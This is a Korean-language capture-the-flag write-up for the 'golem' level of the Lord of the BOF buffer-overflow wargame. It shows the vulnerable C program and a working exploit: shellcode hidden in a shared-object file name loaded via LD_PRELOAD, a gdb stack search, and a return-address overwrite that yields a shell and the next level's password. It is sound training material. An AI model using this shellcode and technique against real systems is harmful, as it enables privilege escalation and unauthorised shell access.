# golem

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

버퍼로부터 48번째 위까지 싹다 초기화시키는 조건이 추가된 문제이다. 

처음 봤을때부터 이건 답이 없다고 생각해서 바로 write-up을 찾아보고 공부하기 시작했다. 

찾았을 때 제일 먼저 보인 것은 LD-PRELOAD라는 것인데, 

LD_PRELOAD는 라이브러리에 있지 않은 것을 사용하려고 할때 등록하면 프로그램이 메모리에 적제되긴 전에 먼저 적제해주는 환경 변수이다.

쉽게 이해하자면 마지막에 있는 memset이 지우지 못하는 스택위치에 환경변수가 올라가게 된다(프로그램보다 먼저 메모리에 올라가기 때문에) 그렇다면 이 환경 변수에 쉘코드를 심어야하는데 프로그램의 이름이 등록되는 것이므로 쉘코드를 포함하고 있는 파일을 하나 만들어 환경 변수로 등록한 후 gdb로 스택 어디에 존재하는지 확인한 뒤에 ret에 덥어 쓰면 성공할 것이다. 

그럼 일단 파일을 생성해보자. 실행파일이어야 하고 참조 가능한 공유 object를 컴파일 해야 하므로 빈 파일을 만든 뒤 컴파일에 옵션(-fPIC -shared)을 줘서 만들어 보자. 파일 이름이므로 당연히 2f는 없어야 한다.

```bash
[skeleton@localhost skeleton]$ touch tmp.c
[skeleton@localhost skeleton]$ gcc -fPIC -shared tmp.c -o `python -c 'print "j"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
[skeleton@localhost skeleton]$ ls
golem
golem.c
j????????????????????????????????????????????????????????????????????????????????????????????????????▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?
tmp.c
```

다음으로 환경 변수 RD_PRELOAD에 파일의 경로를 등록한다.

```bash
[skeleton@localhost skeleton]$ export LD_PRELOAD="/home/skeleton/`python -c 'print "j"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`"
```

이제 gdb로 LD_PRELOAD가 스택 어느 위치에 등록되어 있는지 확인해보자.

파일을 복사하고 gdb로 열어서 breakpoint를 memset후에 걸고 실행될 수 있는 조건에 맞게 입력을 넣어준다.

```bash
[skeleton@localhost skeleton]$ cp golem atack
[skeleton@localhost skeleton]$ gdb -q atack
(gdb) b*main+163
Breakpoint 1 at 0x8048513
(gdb) r `python -c 'print "\xbf"*48'`
Starting program: /home/skeleton/atack `python -c 'print "\xbf"*48'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

Breakpoint 1, 0x8048513 in main ()
```

$esp보다 위에 존재할 것이므로 $esp - 300, 500, 1000, 2000을 줘봤는데 적어도 2000은 줘야 \x90으로 채워진 NOP sled가 확인된다.

```assembly
(gdb) x/100x $esp-2000
0xbffff49c:     0x400041b0      0x00000001      0x0804859c      0x40001528
0xbffff4ac:     0x000002c8      0x00000000      0x080482d0      0x00000000
0xbffff4bc:     0x00000000      0x40000824      0xbffff4d0      0x400075bb
0xbffff4cc:     0x40017000      0x00002fb2      0x40013868      0xbffff6b4
0xbffff4dc:     0x4000380e      0x40014478      0x6d6f682f      0x6b732f65
0xbffff4ec:     0x74656c65      0x6a2f6e6f      0x90909090      0x90909090
0xbffff4fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff50c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff51c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff52c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff53c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff54c:     0x90909090      0x90909090      0x90909090      0x315e11eb
0xbffff55c:     0x8032b1c9      0x01ff0e6c      0x7501e980      0xe805ebf6
0xbffff56c:     0xffffffea      0x6951c132      0x69743030      0x6a633069
0xbffff57c:     0x51e48a6f      0x9ae28a54      0x81ce0cb1      0x40002900
0xbffff58c:     0x40013868      0x4000220c      0xbffffac3      0x00000000
0xbffff59c:     0x00000000      0x00000000      0x00000000      0x40014a00
0xbffff5ac:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5bc:     0x00000006      0x00000000      0x00000000      0x00000000
0xbffff5cc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5dc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5ec:     0x00000000      0x00000000      0x00000001      0x00000000
0xbffff5fc:     0x00000001      0xbffff4e0      0x00060000      0x00000000
0xbffff60c:     0x00000000      0x00000000      0x00000001      0x00000000
0xbffff61c:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) Quit
```

ret으로 0xbffff50c정도 주면 될 것 같다. golem에 직접 공격해보자.

```bash
[skeleton@localhost skeleton]$ ./golem `python -c 'print "\x90"*44+"\x0c\xf5\xff\xbf"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒
bash$ whoami
golem
bash$ my-pass
euid = 511
cup of coffee
```

golem의 password는 cup of coffee이다.

